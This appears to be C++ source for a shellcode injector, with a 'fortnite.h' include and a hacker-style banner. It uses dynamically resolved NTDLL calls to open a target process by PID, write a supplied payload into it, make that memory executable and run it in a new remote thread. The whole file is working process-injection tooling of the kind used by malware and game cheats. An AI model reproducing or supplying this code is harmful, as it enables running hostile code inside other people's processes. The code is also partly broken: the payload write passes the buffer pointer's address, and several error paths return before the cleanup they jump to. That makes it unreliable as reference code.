#include "fortnite.h"
#include <iostream>


using namespace std;

void printBanner() {
    cout << "                            _ ____ ____  _   \n";
    cout << "                           | |___ \\___ \\| |  \n";
    cout << "  ___ _   _ _ __   ___ _ __| | __) |__) | |_ \n";
    cout << " / __| | | | '_ \\ / _ \\ '__| ||__ <|__ <| __|\n";
    cout << " \\__ \\ |_| | |_) |  __/ |  | |___) |__) | |_ \n";
    cout << " |___/\\__,_| .__/ \\___|_|  |_|____/____/ \\__|\n";
    cout << "           | |                               \n";
    cout << "           |_|                               \n";
}
/*
HMODULE GetMod(
    IN LPCWSTR modName
) {
    HMODULE hModule = NULL;
    
    INFO("trying to get a handle to %S", modName);
    hModule = GetModuleHandleW(modName);

    if (hModule == NULL) {
        WARN("failed to get a handle to the module, error: 0x%lx\n", GetLastError());
        return NULL;
    } 
    else {
        OKAY("got a handle to the module!");
        INFO("\\___[ %s\n\t\\_0x%p]\n", modName, hModule);
        return hModule;
    }
}
*/
UINT_PTR GetNtFunctionAddress(
    _In_ LPCSTR FunctionName,
    _In_ CONST HMODULE ModuleHandle
) {

    UINT_PTR FunctionAddress = 0;

    FunctionAddress = (UINT_PTR)GetProcAddress(ModuleHandle, FunctionName);
    if (0 == FunctionAddress) {
        WARN("[GetProcAddress] failed, error: 0x%lx", GetLastError());
        return 0;
    }

    OKAY("[0x%p] -> %s!", (PVOID)FunctionAddress, FunctionName);
    return FunctionAddress;

}
BOOL NTAPIInjection(
    _In_ CONST DWORD PID,
    _In_ CONST PBYTE Payload,
    _In_ SIZE_T PayloadSize
) {
    BOOL State = TRUE;
    PVOID Buffer = NULL;
    HANDLE ThreadHandle = NULL;
    HANDLE ProcessHandle = NULL; 
    HMODULE hNTDLL = NULL;
    DWORD OldProtection = 0;
    SIZE_T BytesWritten = 0;
    NTSTATUS Status = 0;
    CLIENT_ID CID = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };



    hNTDLL = GetModuleHandleW(L"NTDLL");
    if (NULL == hNTDLL) {
        WARN("[GetModuleHandleW] failed, error: 0x%lx", GetLastError());
        return FALSE;
    }

    // HMODULE hNTDLL = GetMod(L"NTDLL");

    NtOpenProcess p_NtOpenProcess = (NtOpenProcess)GetNtFunctionAddress("NtOpenProcess", hNTDLL);
    NtAllocateVirtualMemory p_NtAllocateVirtualMemory = (NtAllocateVirtualMemory)GetNtFunctionAddress("NtAllocateVirtualMemory", hNTDLL);
    NtWriteVirtualMemory p_NtWriteVirtualMemory = (NtWriteVirtualMemory)GetNtFunctionAddress("NtWriteVirtualMemory", hNTDLL);
    NtProtectVirtualMemory p_NtProtectVirtualMemory = (NtProtectVirtualMemory)GetNtFunctionAddress("NtProtectVirtualMemory", hNTDLL);
    NtFreeVirtualMemory p_NtFreeVirtualMemory = (NtFreeVirtualMemory)GetNtFunctionAddress("NtFreeVirtualMemory", hNTDLL);
    NtCreateThreadEx p_NtCreateThreadEx = (NtCreateThreadEx)GetNtFunctionAddress("NtCreateThreadEx", hNTDLL);
    NtClose p_NtClose = (NtClose)GetNtFunctionAddress("NtClose", hNTDLL);
    NtWaitForSingleObject p_NtWaitForSingleObject = (NtWaitForSingleObject)GetNtFunctionAddress("NtWaitForSingleObject", hNTDLL);

    Status = p_NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtOpenProcess", Status);
        return FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] got a handle on the process (%ld)!", ProcessHandle, PID);

    Status = p_NtAllocateVirtualMemory(ProcessHandle, &Buffer, 0, &PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtAllocateVirtualMemory", Status);
        return FALSE; goto CLEANUP;
    }
    Status = p_NtWriteVirtualMemory(ProcessHandle, &Buffer, Payload, PayloadSize, &BytesWritten);
        if (STATUS_SUCCESS != Status) {
            PRINT_ERROR("NtWriteVirtualMemory", Status);
            return FALSE; goto CLEANUP;
        }

    OKAY("[0x%p] [RW-] allocated a %zu-byte buffer with PAGE_READWRITE [RW-] permissions!", Buffer, PayloadSize);


    Status = p_NtProtectVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtProtectVirtualMemory", Status);
        return FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [R-X] changed allocated buffer protection to PAGE_EXECUTE_READ [R-X]!", Buffer);

    Status = p_NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, &OA, ProcessHandle, Buffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtCreateThreadEx", Status);
        State = FALSE; goto CLEANUP;
    }


    OKAY("[0x%p] successfully created a thread!", ThreadHandle);
    INFO("[0x%p] waiting for thread to finish execution...", ThreadHandle);
    Status = p_NtWaitForSingleObject(ThreadHandle, FALSE, NULL);
    INFO("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);


CLEANUP:

    if (Buffer) {
        Status = p_NtFreeVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, MEM_DECOMMIT);
        if (STATUS_SUCCESS != Status) {
            PRINT_ERROR("NtFreeVirtualMemory", Status);
        }
        else {
            INFO("[0x%p] decommitted allocated buffer from process memory", Buffer);
        }
    }

    if (ThreadHandle) {
        p_NtClose(ThreadHandle);
        INFO("[0x%p] handle on thread closed", ThreadHandle);
    }

    if (ProcessHandle) {
        p_NtClose(ProcessHandle);
        INFO("[0x%p] handle on process closed", ProcessHandle);
    }

    return State;

}